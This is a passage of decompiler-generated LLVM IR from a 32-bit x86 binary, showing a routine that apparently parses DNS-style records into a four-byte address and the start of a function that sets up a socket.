  store i32 1, i32* @ebx, align 4
  %v2_804dc94 = mul nuw nsw i32 %v1_804dc81, 256
  %v2_804dc97 = add nsw i32 %v2_804dc94, -49152
  %v3_804dc97 = or i32 %v4_804dc86, %v2_804dc97
  store i32 %v3_804dc97, i32* %eax.global-to-local, align 4
  %v2_804dca2 = add i32 %v1_804dc9e, %v3_804dc97
  store i32 %v2_804dca2, i32* %edx.global-to-local, align 4
  %v1_804dca4 = inttoptr i32 %v2_804dca2 to i8*
  %v2_804dca4 = load i8, i8* %v1_804dca4, align 1
  %v3_804dca4 = zext i8 %v2_804dca4 to i32
  %v6_804dca4 = or i32 %v3_804dca4, %v2_804dc97
  store i32 %v6_804dca4, i32* %eax.global-to-local, align 4
  %v4_804dca6 = icmp eq i8 %v2_804dca4, 0
  %v1_804dca8 = icmp eq i1 %v4_804dca6, false
  br i1 %v1_804dca8, label %dec_label_pc_804dc79, label %dec_label_pc_804dcaa

dec_label_pc_804dcaa:                             ; preds = %dec_label_pc_804dd3c, %dec_label_pc_804dc81, %dec_label_pc_804dc6a
  %v4_804dcc625 = phi i32 [ %v6_804dc7318, %dec_label_pc_804dc6a ], [ %v6_804dca4, %dec_label_pc_804dc81 ], [ %v6_804dc73, %dec_label_pc_804dd3c ]
  %v5_804dd60 = phi i32 [ %v0_804dc6a, %dec_label_pc_804dc6a ], [ %v2_804dca2, %dec_label_pc_804dc81 ], [ %v1_804dd3c, %dec_label_pc_804dd3c ]
  %v1_804dcaa = phi i32 [ 0, %dec_label_pc_804dc6a ], [ 1, %dec_label_pc_804dc81 ], [ %v0_804dd3d, %dec_label_pc_804dd3c ]
  %v0_804dcaa = phi i32 [ 1, %dec_label_pc_804dc6a ], [ %v0_804dd40, %dec_label_pc_804dc81 ], [ %v3_804dd40, %dec_label_pc_804dd3c ]
  %v2_804dcaa = add i32 %v1_804dcaa, %v0_804dc6a
  %v2_804dcac = add i32 %v2_804dcaa, %v0_804dcaa
  store i32 %v2_804dcac, i32* @esi, align 4
  %v1_804dcaf = inttoptr i32 %v2_804dcac to i16*
  %v2_804dcaf = load i16, i16* %v1_804dcaf, align 2
  %v8_804dcaf = icmp eq i16 %v2_804dcaf, 256
  %v1_804dcb4 = add i32 %v2_804dcac, 10
  store i32 %v1_804dcb4, i32* @edi, align 4
  br i1 %v8_804dcaf, label %dec_label_pc_804dd54, label %dec_label_pc_804dcbd

dec_label_pc_804dcbd:                             ; preds = %dec_label_pc_804dd54, %dec_label_pc_804dcaa
  store i32 %v1_804dcb4, i32* %edx.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_804dcc622 = inttoptr i32 %v1_804dcb4 to i8*
  %v2_804dcc623 = load i8, i8* %v1_804dcc622, align 1
  %v3_804dcc624 = zext i8 %v2_804dcc623 to i32
  %v5_804dcc626 = and i32 %v4_804dcc625, -256
  %v6_804dcc627 = or i32 %v3_804dcc624, %v5_804dcc626
  store i32 %v6_804dcc627, i32* %eax.global-to-local, align 4
  %v4_804dcc828 = icmp eq i8 %v2_804dcc623, 0
  br i1 %v4_804dcc828, label %dec_label_pc_804dcf9, label %dec_label_pc_804dccc.preheader.preheader

dec_label_pc_804dccc.preheader.preheader:         ; preds = %dec_label_pc_804dcbd
  %v1_804dced = add i32 %v0_804dc62127, 32
  br label %dec_label_pc_804dccc.preheader

dec_label_pc_804dccc.preheader:                   ; preds = %dec_label_pc_804dccc.preheader.preheader, %dec_label_pc_804dd48
  %v0_804dd4c = phi i32 [ %v3_804dd4c, %dec_label_pc_804dd48 ], [ 1, %dec_label_pc_804dccc.preheader.preheader ]
  %v0_804dd4961 = phi i32 [ %v0_804dd49, %dec_label_pc_804dd48 ], [ 0, %dec_label_pc_804dccc.preheader.preheader ]
  %v0_804dcd557 = phi i32 [ %v1_804dd48, %dec_label_pc_804dd48 ], [ %v1_804dcb4, %dec_label_pc_804dccc.preheader.preheader ]
  %v0_804dccc55 = phi i32 [ %v6_804dcc6, %dec_label_pc_804dd48 ], [ %v6_804dcc627, %dec_label_pc_804dccc.preheader.preheader ]
  br label %dec_label_pc_804dccc

dec_label_pc_804dccc:                             ; preds = %dec_label_pc_804dccc.preheader, %dec_label_pc_804dcd0
  %v0_804dd49 = phi i32 [ %v0_804dd4961, %dec_label_pc_804dccc.preheader ], [ 1, %dec_label_pc_804dcd0 ]
  %v0_804dd48 = phi i32 [ %v0_804dcd557, %dec_label_pc_804dccc.preheader ], [ %v2_804dcf1, %dec_label_pc_804dcd0 ]
  %v4_804dcc6 = phi i32 [ %v0_804dccc55, %dec_label_pc_804dccc.preheader ], [ %v6_804dcf3, %dec_label_pc_804dcd0 ]
  %v1_804dccc = trunc i32 %v4_804dcc6 to i8
  %tmp140 = icmp ult i8 %v1_804dccc, -64
  br i1 %tmp140, label %dec_label_pc_804dd48, label %dec_label_pc_804dcd0

dec_label_pc_804dcd0:                             ; preds = %dec_label_pc_804dccc
  %v1_804dcd0 = urem i32 %v4_804dcc6, 256
  store i32 %v1_804dcd0, i32* %eax.global-to-local, align 4
  %v1_804dcd5 = add i32 %v0_804dd48, 1
  %v2_804dcd5 = inttoptr i32 %v1_804dcd5 to i8*
  %v3_804dcd5 = load i8, i8* %v2_804dcd5, align 1
  %v4_804dcd5 = zext i8 %v3_804dcd5 to i32
  store i32 1, i32* %ecx.global-to-local, align 4
  %v2_804dce3 = mul nuw nsw i32 %v1_804dcd0, 256
  %v2_804dce6 = add nsw i32 %v2_804dce3, -49152
  %v3_804dce6 = or i32 %v4_804dcd5, %v2_804dce6
  store i32 %v3_804dce6, i32* %eax.global-to-local, align 4
  %v2_804dcf1 = add i32 %v1_804dced, %v3_804dce6
  store i32 %v2_804dcf1, i32* %edx.global-to-local, align 4
  %v1_804dcf3 = inttoptr i32 %v2_804dcf1 to i8*
  %v2_804dcf3 = load i8, i8* %v1_804dcf3, align 1
  %v3_804dcf3 = zext i8 %v2_804dcf3 to i32
  %v6_804dcf3 = or i32 %v3_804dcf3, %v2_804dce6
  store i32 %v6_804dcf3, i32* %eax.global-to-local, align 4
  %v4_804dcf5 = icmp eq i8 %v2_804dcf3, 0
  %v1_804dcf7 = icmp eq i1 %v4_804dcf5, false
  br i1 %v1_804dcf7, label %dec_label_pc_804dccc, label %dec_label_pc_804dcf9

dec_label_pc_804dcf9:                             ; preds = %dec_label_pc_804dd48, %dec_label_pc_804dcd0, %dec_label_pc_804dcbd
  %v1_804dcf9 = phi i32 [ 0, %dec_label_pc_804dcbd ], [ 1, %dec_label_pc_804dcd0 ], [ %v0_804dd49, %dec_label_pc_804dd48 ]
  %v0_804dcf9 = phi i32 [ 1, %dec_label_pc_804dcbd ], [ %v0_804dd4c, %dec_label_pc_804dcd0 ], [ %v3_804dd4c, %dec_label_pc_804dd48 ]
  %v2_804dcf9 = add i32 %v0_804dcf9, %v1_804dcf9
  store i32 %v2_804dcf9, i32* @ebx, align 4
  %v2_804dcfb = add i32 %v2_804dcf9, %v1_804dcb4
  br label %dec_label_pc_804dc5d.backedge

dec_label_pc_804dc5d.backedge:                    ; preds = %dec_label_pc_804dcf9, %dec_label_pc_804dd70
  %v0_804dc5d = phi i32 [ %v0_804dc62127, %dec_label_pc_804dcf9 ], [ %v0_804dc5d.pre, %dec_label_pc_804dd70 ]
  %storemerge = phi i32 [ %v2_804dcfb, %dec_label_pc_804dcf9 ], [ %v2_804dd7b, %dec_label_pc_804dd70 ]
  store i32 %storemerge, i32* %ecx.global-to-local, align 4
  %v1_804dc5d = add i32 %v0_804dc5d, 22
  %v2_804dc5d = inttoptr i32 %v1_804dc5d to i16*
  %v3_804dc5d = load i16, i16* %v2_804dc5d, align 2
  %v4_804dc5d = add i16 %v3_804dc5d, -1
  store i16 %v4_804dc5d, i16* %v2_804dc5d, align 2
  %v0_804dc62 = load i32, i32* @esp, align 4
  %v1_804dc62 = add i32 %v0_804dc62, 22
  %v2_804dc62 = inttoptr i32 %v1_804dc62 to i16*
  %v3_804dc62 = load i16, i16* %v2_804dc62, align 2
  %v13_804dc62 = icmp eq i16 %v3_804dc62, -1
  br i1 %v13_804dc62, label %dec_label_pc_804dbf4, label %dec_label_pc_804dc6a

dec_label_pc_804dd03:                             ; preds = %dec_label_pc_804dbf4
  %v1_804dd03 = add i32 %v2_804dc00, 4
  %v2_804dd03 = inttoptr i32 %v1_804dd03 to i32*
  %v3_804dd03 = load i32, i32* %v2_804dd03, align 4
  store i32 %v3_804dd03, i32* %eax.global-to-local, align 4
  %v1_804dd06 = icmp eq i32 %v3_804dd03, 0
  br i1 %v1_804dd06, label %dec_label_pc_804dd16, label %dec_label_pc_804dd0a

dec_label_pc_804dd0a:                             ; preds = %dec_label_pc_804dd03
  %v3_804dd0d = inttoptr i32 %v0_804dbfd to i32*
  store i32 %v3_804dd03, i32* %v3_804dd0d, align 4
  %v1_804dd0e = call i32 @function_8051963(i32 1)
  store i32 %v1_804dd0e, i32* %eax.global-to-local, align 4
  %v0_804dd13 = load i32, i32* @esp, align 4
  %v1_804dd13 = add i32 %v0_804dd13, 16
  br label %dec_label_pc_804dd16

dec_label_pc_804dd16:                             ; preds = %dec_label_pc_804dd03, %dec_label_pc_804dd0a
  %v0_804dd16 = phi i32 [ %v1_804dbfd, %dec_label_pc_804dd03 ], [ %v1_804dd13, %dec_label_pc_804dd0a ]
  %v2_804dd19 = inttoptr i32 %v0_804dd16 to i32*
  %v3_804dd19 = load i32, i32* %v2_804dd19, align 4
  store i32 %v3_804dd19, i32* @esi, align 4
  %v2_804dd1d = add i32 %v0_804dd16, -16
  %v3_804dd1d = inttoptr i32 %v2_804dd1d to i32*
  store i32 %v3_804dd19, i32* %v3_804dd1d, align 4
  %v1_804dd1e = call i32 @function_8051963(i32 1)
  store i32 %v1_804dd1e, i32* %eax.global-to-local, align 4
  %v0_804dd23 = load i32, i32* @esp, align 4
  %v1_804dd23 = add i32 %v0_804dd23, 16
  %v2_804dd23 = inttoptr i32 %v1_804dd23 to i32*
  store i32 0, i32* %v2_804dd23, align 4
  %v0_804dd2b = load i32, i32* @esp, align 4
  %v1_804dd2b = add i32 %v0_804dd2b, 16
  %v1_804dd2e = inttoptr i32 %v1_804dd2b to i32*
  %v2_804dd2e = load i32, i32* %v1_804dd2e, align 4
  store i32 %v2_804dd2e, i32* %eax.global-to-local, align 4
  %v1_804dd31 = add i32 %v0_804dd2b, 4300
  %v1_804dd37 = inttoptr i32 %v1_804dd31 to i32*
  %v2_804dd37 = load i32, i32* %v1_804dd37, align 4
  store i32 %v2_804dd37, i32* @ebx, align 4
  %v3_804dd38 = add i32 %v0_804dd2b, 4308
  %v1_804dd39 = inttoptr i32 %v3_804dd38 to i32*
  %v2_804dd39 = load i32, i32* %v1_804dd39, align 4
  store i32 %v2_804dd39, i32* @edi, align 4
  %v3_804dd39 = add i32 %v0_804dd2b, 4312
  %v1_804dd3a = inttoptr i32 %v3_804dd39 to i32*
  %v2_804dd3a = load i32, i32* %v1_804dd3a, align 4
  store i32 %v2_804dd3a, i32* @ebp, align 4
  ret i32 %v2_804dd2e

dec_label_pc_804dd3c:                             ; preds = %dec_label_pc_804dc79
  %v1_804dd3c = add i32 %v0_804dd3c, 1
  store i32 %v1_804dd3c, i32* %edx.global-to-local, align 4
  %v5_804dd3d = icmp eq i32 %v0_804dd3d, 0
  %v2_804dd40 = zext i1 %v5_804dd3d to i32
  %v3_804dd40 = add i32 %v2_804dd40, %v0_804dd40
  %v1_804dc73 = inttoptr i32 %v1_804dd3c to i8*
  %v2_804dc73 = load i8, i8* %v1_804dc73, align 1
  %v3_804dc73 = zext i8 %v2_804dc73 to i32
  %v5_804dc73 = and i32 %v4_804dc73, -256
  %v6_804dc73 = or i32 %v3_804dc73, %v5_804dc73
  store i32 %v6_804dc73, i32* %eax.global-to-local, align 4
  %v4_804dc75 = icmp eq i8 %v2_804dc73, 0
  br i1 %v4_804dc75, label %dec_label_pc_804dcaa, label %dec_label_pc_804dc79.preheader

dec_label_pc_804dd48:                             ; preds = %dec_label_pc_804dccc
  %v1_804dd48 = add i32 %v0_804dd48, 1
  store i32 %v1_804dd48, i32* %edx.global-to-local, align 4
  %v5_804dd49 = icmp eq i32 %v0_804dd49, 0
  %v2_804dd4c = zext i1 %v5_804dd49 to i32
  %v3_804dd4c = add i32 %v2_804dd4c, %v0_804dd4c
  %v1_804dcc6 = inttoptr i32 %v1_804dd48 to i8*
  %v2_804dcc6 = load i8, i8* %v1_804dcc6, align 1
  %v3_804dcc6 = zext i8 %v2_804dcc6 to i32
  %v5_804dcc6 = and i32 %v4_804dcc6, -256
  %v6_804dcc6 = or i32 %v3_804dcc6, %v5_804dcc6
  store i32 %v6_804dcc6, i32* %eax.global-to-local, align 4
  %v4_804dcc8 = icmp eq i8 %v2_804dcc6, 0
  br i1 %v4_804dcc8, label %dec_label_pc_804dcf9, label %dec_label_pc_804dccc.preheader

dec_label_pc_804dd54:                             ; preds = %dec_label_pc_804dcaa
  %v1_804dd54 = add i32 %v2_804dcac, 2
  %v2_804dd54 = inttoptr i32 %v1_804dd54 to i16*
  %v3_804dd54 = load i16, i16* %v2_804dd54, align 2
  %v9_804dd54 = icmp eq i16 %v3_804dd54, 256
  %v1_804dd5a = icmp eq i1 %v9_804dd54, false
  br i1 %v1_804dd5a, label %dec_label_pc_804dcbd, label %dec_label_pc_804dd60

dec_label_pc_804dd60:                             ; preds = %dec_label_pc_804dd54
  %v1_804dd60 = add i32 %v2_804dcac, 8
  %v2_804dd60 = inttoptr i32 %v1_804dd60 to i16*
  %v3_804dd60 = load i16, i16* %v2_804dd60, align 2
  %v4_804dd60 = zext i16 %v3_804dd60 to i32
  %v6_804dd60 = and i32 %v5_804dd60, -65536
  %v7_804dd60 = or i32 %v4_804dd60, %v6_804dd60
  store i32 %v7_804dd60, i32* %edx.global-to-local, align 4
  %v2_804dd66 = call i16 @llvm.bswap.i16(i16 %v3_804dd60)
  %v3_804dd66 = zext i16 %v2_804dd66 to i32
  %v6_804dd66 = or i32 %v3_804dd66, %v6_804dd60
  store i32 %v6_804dd66, i32* %eax.global-to-local, align 4
  %v10_804dd6a = icmp eq i16 %v3_804dd60, 1024
  br i1 %v10_804dd6a, label %dec_label_pc_804dd83, label %dec_label_pc_804dd70

dec_label_pc_804dd70:                             ; preds = %dec_label_pc_804dd60, %dec_label_pc_804dd83
  %v0_804dc5d.pre = phi i32 [ %v0_804dc62127, %dec_label_pc_804dd60 ], [ %v0_804dc5d.pre.pre, %dec_label_pc_804dd83 ]
  %v0_804dd7b = phi i32 [ %v1_804dcb4, %dec_label_pc_804dd60 ], [ %v0_804dd7b.pre, %dec_label_pc_804dd83 ]
  %v0_804dd70 = phi i32 [ %v7_804dd60, %dec_label_pc_804dd60 ], [ %v7_804dde7, %dec_label_pc_804dd83 ]
  %v1_804dd70 = trunc i32 %v0_804dd70 to i16
  %v2_804dd70 = call i16 @llvm.bswap.i16(i16 %v1_804dd70)
  %v3_804dd70 = zext i16 %v2_804dd70 to i32
  %v5_804dd70 = and i32 %v0_804dd70, -65536
  %v6_804dd70 = or i32 %v3_804dd70, %v5_804dd70
  store i32 %v6_804dd70, i32* %edx.global-to-local, align 4
  store i32 %v3_804dd70, i32* %eax.global-to-local, align 4
  %v2_804dd7b = add i32 %v3_804dd70, %v0_804dd7b
  br label %dec_label_pc_804dc5d.backedge

dec_label_pc_804dd83:                             ; preds = %dec_label_pc_804dd60
  %v2_804dd83 = inttoptr i32 %v1_804dcb4 to i8*
  %v3_804dd83 = load i8, i8* %v2_804dd83, align 1
  %v4_804dd83 = zext i8 %v3_804dd83 to i32
  %v6_804dd83 = and i32 %v6_804dd66, -256
  %v7_804dd83 = or i32 %v4_804dd83, %v6_804dd83
  store i32 %v7_804dd83, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v3_804dd88 = add i32 %v0_804dc62127, 4280
  %v4_804dd88 = inttoptr i32 %v3_804dd88 to i8*
  store i8 %v3_804dd83, i8* %v4_804dd88, align 1
  %v0_804dd8f = load i32, i32* @edi, align 4
  %v1_804dd8f = add i32 %v0_804dd8f, 1
  %v2_804dd8f = inttoptr i32 %v1_804dd8f to i8*
  %v3_804dd8f = load i8, i8* %v2_804dd8f, align 1
  %v4_804dd8f = zext i8 %v3_804dd8f to i32
  %v5_804dd8f = load i32, i32* %eax.global-to-local, align 4
  %v6_804dd8f = and i32 %v5_804dd8f, -256
  %v7_804dd8f = or i32 %v6_804dd8f, %v4_804dd8f
  store i32 %v7_804dd8f, i32* %eax.global-to-local, align 4
  %v2_804dd92 = load i32, i32* @esp, align 4
  %v3_804dd92 = add i32 %v2_804dd92, 4281
  %v4_804dd92 = inttoptr i32 %v3_804dd92 to i8*
  store i8 %v3_804dd8f, i8* %v4_804dd92, align 1
  %v0_804dd99 = load i32, i32* @edi, align 4
  %v1_804dd99 = add i32 %v0_804dd99, 2
  %v2_804dd99 = inttoptr i32 %v1_804dd99 to i8*
  %v3_804dd99 = load i8, i8* %v2_804dd99, align 1
  %v4_804dd99 = zext i8 %v3_804dd99 to i32
  %v5_804dd99 = load i32, i32* %eax.global-to-local, align 4
  %v6_804dd99 = and i32 %v5_804dd99, -256
  %v7_804dd99 = or i32 %v6_804dd99, %v4_804dd99
  store i32 %v7_804dd99, i32* %eax.global-to-local, align 4
  %v2_804dd9c = load i32, i32* @esp, align 4
  %v3_804dd9c = add i32 %v2_804dd9c, 4282
  %v4_804dd9c = inttoptr i32 %v3_804dd9c to i8*
  store i8 %v3_804dd99, i8* %v4_804dd9c, align 1
  %v0_804dda3 = load i32, i32* @edi, align 4
  %v1_804dda3 = add i32 %v0_804dda3, 3
  %v2_804dda3 = inttoptr i32 %v1_804dda3 to i8*
  %v3_804dda3 = load i8, i8* %v2_804dda3, align 1
  %v4_804dda3 = zext i8 %v3_804dda3 to i32
  %v5_804dda3 = load i32, i32* %eax.global-to-local, align 4
  %v6_804dda3 = and i32 %v5_804dda3, -256
  %v7_804dda3 = or i32 %v6_804dda3, %v4_804dda3
  store i32 %v7_804dda3, i32* %eax.global-to-local, align 4
  %v2_804dda6 = load i32, i32* @esp, align 4
  %v3_804dda6 = add i32 %v2_804dda6, 4283
  %v4_804dda6 = inttoptr i32 %v3_804dda6 to i8*
  store i8 %v3_804dda3, i8* %v4_804dda6, align 1
  %v0_804ddad = load i32, i32* %eax.global-to-local, align 4
  %v1_804ddad = load i32, i32* @esp, align 4
  %v2_804ddad = add i32 %v1_804ddad, -4
  %v3_804ddad = inttoptr i32 %v2_804ddad to i32*
  store i32 %v0_804ddad, i32* %v3_804ddad, align 4
  %v0_804ddae = load i32, i32* %eax.global-to-local, align 4
  %v2_804ddae = add i32 %v1_804ddad, -8
  %v3_804ddae = inttoptr i32 %v2_804ddae to i32*
  store i32 %v0_804ddae, i32* %v3_804ddae, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804ddb1 = inttoptr i32 %v1_804ddad to i32*
  %v3_804ddb1 = load i32, i32* %v2_804ddb1, align 4
  store i32 %v3_804ddb1, i32* @edx, align 4
  %v1_804ddb5 = inttoptr i32 %v3_804ddb1 to i8*
  %v2_804ddb5 = load i8, i8* %v1_804ddb5, align 1
  %v3_804ddb5 = zext i8 %v2_804ddb5 to i32
  %v1_804ddb7 = mul nuw nsw i32 %v3_804ddb5, 4
  %v2_804ddb7 = add nuw nsw i32 %v1_804ddb7, 4
  store i32 %v2_804ddb7, i32* %eax.global-to-local, align 4
  %v2_804ddbe = add i32 %v1_804ddad, -12
  %v3_804ddbe = inttoptr i32 %v2_804ddbe to i32*
  store i32 %v2_804ddb7, i32* %v3_804ddbe, align 4
  %v0_804ddbf = load i32, i32* @edx, align 4
  %v1_804ddbf = add i32 %v0_804ddbf, 4
  %v2_804ddbf = inttoptr i32 %v1_804ddbf to i32*
  %v3_804ddbf = load i32, i32* %v2_804ddbf, align 4
  store i32 %v3_804ddbf, i32* %eax.global-to-local, align 4
  %v2_804ddc2 = add i32 %v1_804ddad, -16
  %v3_804ddc2 = inttoptr i32 %v2_804ddc2 to i32*
  store i32 %v3_804ddbf, i32* %v3_804ddc2, align 4
  %v0_804ddc3 = call i32 @function_8051406()
  store i32 %v0_804ddc3, i32* %eax.global-to-local, align 4
  %v0_804ddc8 = load i32, i32* @esp, align 4
  %v1_804ddc8 = add i32 %v0_804ddc8, 16
  %v2_804ddc8 = inttoptr i32 %v1_804ddc8 to i32*
  %v3_804ddc8 = load i32, i32* %v2_804ddc8, align 4
  store i32 %v3_804ddc8, i32* %ecx.global-to-local, align 4
  %v1_804ddcc = inttoptr i32 %v3_804ddc8 to i8*
  %v2_804ddcc = load i8, i8* %v1_804ddcc, align 1
  %v3_804ddcc = zext i8 %v2_804ddcc to i32
  %v4_804ddcc = load i32, i32* @edx, align 4
  %v5_804ddcc = and i32 %v4_804ddcc, -256
  %v6_804ddcc = or i32 %v5_804ddcc, %v3_804ddcc
  store i32 %v6_804ddcc, i32* %edx.global-to-local, align 4
  %v2_804ddce = add i32 %v3_804ddc8, 4
  %v3_804ddce = inttoptr i32 %v2_804ddce to i32*
  store i32 %v0_804ddc3, i32* %v3_804ddce, align 4
  %v0_804ddd1 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ddd1 = urem i32 %v0_804ddd1, 256
  %v2_804ddd1 = load i32, i32* @ebx, align 4
  %v3_804ddd1 = and i32 %v2_804ddd1, -256
  %v4_804ddd1 = or i32 %v3_804ddd1, %v1_804ddd1
  store i32 %v4_804ddd1, i32* @ebx, align 4
  %v0_804ddd3 = load i32, i32* @esp, align 4
  %v1_804ddd3 = add i32 %v0_804ddd3, 4296
  %v2_804ddd3 = inttoptr i32 %v1_804ddd3 to i32*
  %v3_804ddd3 = load i32, i32* %v2_804ddd3, align 4
  store i32 %v3_804ddd3, i32* %ecx.global-to-local, align 4
  %v1_804ddda = add i32 %v0_804ddd1, 1
  store i32 %v1_804ddda, i32* %edx.global-to-local, align 4
  %v3_804dddb = mul i32 %v4_804ddd1, 4
  %v4_804dddb = add i32 %v3_804dddb, %v0_804ddc3
  %v5_804dddb = inttoptr i32 %v4_804dddb to i32*
  store i32 %v3_804ddd3, i32* %v5_804dddb, align 4
  %v0_804ddde = load i32, i32* @esp, align 4
  %v1_804ddde = add i32 %v0_804ddde, 16
  %v2_804ddde = inttoptr i32 %v1_804ddde to i32*
  %v3_804ddde = load i32, i32* %v2_804ddde, align 4
  store i32 %v3_804ddde, i32* %eax.global-to-local, align 4
  %v0_804dde5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804dde5 = trunc i32 %v0_804dde5 to i8
  %v3_804dde5 = inttoptr i32 %v3_804ddde to i8*
  store i8 %v1_804dde5, i8* %v3_804dde5, align 1
  %v0_804dde7 = load i32, i32* @esi, align 4
  %v1_804dde7 = add i32 %v0_804dde7, 8
  %v2_804dde7 = inttoptr i32 %v1_804dde7 to i16*
  %v3_804dde7 = load i16, i16* %v2_804dde7, align 2
  %v4_804dde7 = zext i16 %v3_804dde7 to i32
  %v5_804dde7 = load i32, i32* %edx.global-to-local, align 4
  %v6_804dde7 = and i32 %v5_804dde7, -65536
  %v7_804dde7 = or i32 %v6_804dde7, %v4_804dde7
  store i32 %v7_804dde7, i32* %edx.global-to-local, align 4
  %v0_804dd7b.pre = load i32, i32* @edi, align 4
  %v0_804dc5d.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804dd70

; uselistorder directives
  uselistorder i32 %v7_804dde7, { 1, 0 }
  uselistorder i32 %v0_804ddd1, { 1, 0 }
  uselistorder i32 %v3_804dd70, { 0, 2, 1 }
  uselistorder i32 %v0_804dd70, { 1, 0 }
  uselistorder i32 %v6_804dcc6, { 1, 0 }
  uselistorder i32 %v3_804dd4c, { 1, 0 }
  uselistorder i32 %v1_804dd48, { 1, 2, 0 }
  uselistorder i32 %v6_804dc73, { 2, 1, 0 }
  uselistorder i32 %v3_804dd40, { 1, 0 }
  uselistorder i32 %v1_804dd3c, { 2, 3, 1, 0 }
  uselistorder i32 %v0_804dd16, { 1, 0 }
  uselistorder i32 %v0_804dc62, { 2, 1, 0 }
  uselistorder i32 %v6_804dcf3, { 1, 0 }
  uselistorder i32 %v2_804dcf1, { 1, 2, 0 }
  uselistorder i32 %v3_804dce6, { 1, 0 }
  uselistorder i32 %v4_804dcc6, { 1, 0, 2 }
  uselistorder i32 %v0_804dd49, { 2, 0, 1 }
  uselistorder i32 %v0_804dd4c, { 1, 0 }
  uselistorder i32 %v1_804dcb4, { 5, 4, 1, 0, 2, 3, 6 }
  uselistorder i32 %v6_804dca4, { 0, 2, 1 }
  uselistorder i32 %v2_804dca2, { 0, 2, 3, 1 }
  uselistorder i32 %v3_804dc97, { 1, 0 }
  uselistorder i32 %v4_804dc73, { 1, 0, 2 }
  uselistorder i32 %v0_804dd3d, { 2, 0, 1 }
  uselistorder i32 %v0_804dd40, { 1, 0 }
  uselistorder i32 %v6_804dc7318, { 1, 0, 2 }
  uselistorder i32 %v0_804dc6a, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804dc62127, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_804dc62122, { 0, 2, 1 }
  uselistorder i32 %v1_804dc33, { 1, 0 }
  uselistorder i32 %v0_804dc2f, { 0, 1, 2, 4, 5, 3 }
  uselistorder i32 %v2_804dc2a, { 1, 0, 2 }
  uselistorder i32 %v0_804dbfd, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_804dbda, { 1, 0 }
  uselistorder i32 %v1_804dbd9, { 1, 0 }
  uselistorder i32 %v3_804dbae, { 1, 0 }
  uselistorder i32 %v0_804db65, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 %v1_804db2d, { 1, 0 }
  uselistorder i32 %v2_804db2a, { 1, 0 }
  uselistorder i32 %v0_804db26, { 1, 0 }
  uselistorder i32 %v1_804db13, { 2, 0, 1, 3 }
  uselistorder i32 %v12_804db07, { 1, 0 }
  uselistorder i32 %v0_804db04, { 2, 0, 1 }
  uselistorder i32 %v0_804daef, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_804dacd, { 0, 6, 1, 2, 3, 4, 5 }
  uselistorder i32 %v0_804daae, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v4_804daa9, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804da91, { 1, 0 }
  uselistorder i32 %v2_804da18, { 1, 0 }
  uselistorder i32 %v1_804da0a, { 1, 0 }
  uselistorder i8 %v2_804d996, { 1, 0, 2 }
  uselistorder i32 %v2_804d983, { 1, 0, 2 }
  uselistorder i32 %v2_804d970, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 13, 9, 10, 11, 12, 14, 15 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 27, 16, 17, 18, 19, 20, 21, 22, 62, 24, 25, 26, 60, 61, 28, 29, 30, 31, 32, 33, 34, 56, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 57, 58, 59 }
  uselistorder i16 -1, { 2, 3, 0, 1 }
  uselistorder i32 4312, { 1, 0 }
  uselistorder i32 4308, { 1, 0 }
  uselistorder i32 4300, { 1, 0 }
  uselistorder label %dec_label_pc_804dd70, { 1, 0 }
  uselistorder label %dec_label_pc_804dd16, { 1, 0 }
  uselistorder label %dec_label_pc_804dc5d.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804dccc, { 1, 0 }
  uselistorder label %dec_label_pc_804dccc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804dc79, { 1, 0 }
  uselistorder label %dec_label_pc_804dc79.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804dc6a, { 1, 0 }
  uselistorder label %dec_label_pc_804dbf4, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804daa2, { 1, 0 }
  uselistorder label %dec_label_pc_804d996, { 1, 0 }
}

define i32 @function_804ddf0() local_unnamed_addr {
dec_label_pc_804ddf0:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_804ddf0 = load i32, i32* @ebx, align 4
  %v0_804ddf1 = load i32, i32* @eax, align 4
  store i32 %v0_804ddf1, i32* @ebx, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_804de16 = add i32 %v0_804ddf1, 4
  %v2_804de16 = inttoptr i32 %v1_804de16 to i32*
  %v3_804de16 = load i32, i32* %v2_804de16, align 4
  %v10_804de19 = icmp eq i32 %v3_804de16, -1
  br i1 %v10_804de19, label %dec_label_pc_804ddf0.dec_label_pc_804de2a_crit_edge, label %dec_label_pc_804de1e

dec_label_pc_804ddf0.dec_label_pc_804de2a_crit_edge: ; preds = %dec_label_pc_804ddf0
  br label %dec_label_pc_804de2a

dec_label_pc_804de1e:                             ; preds = %dec_label_pc_804ddf0
  %v1_804de22 = call i32 @function_8050233(i32 %v3_804de16)
  br label %dec_label_pc_804de2a

dec_label_pc_804de2a:                             ; preds = %dec_label_pc_804ddf0.dec_label_pc_804de2a_crit_edge, %dec_label_pc_804de1e
  %v0_804de2a = phi i32 [ -1, %dec_label_pc_804ddf0.dec_label_pc_804de2a_crit_edge ], [ %v1_804de22, %dec_label_pc_804de1e ]
  %v4_804de31 = call i32 @function_8050a17(i32 2, i32 1, i32 0, i32 %v0_804de2a)
  %v1_804de39 = load i32, i32* @ebx, align 4
  %v2_804de39 = add i32 %v1_804de39, 4
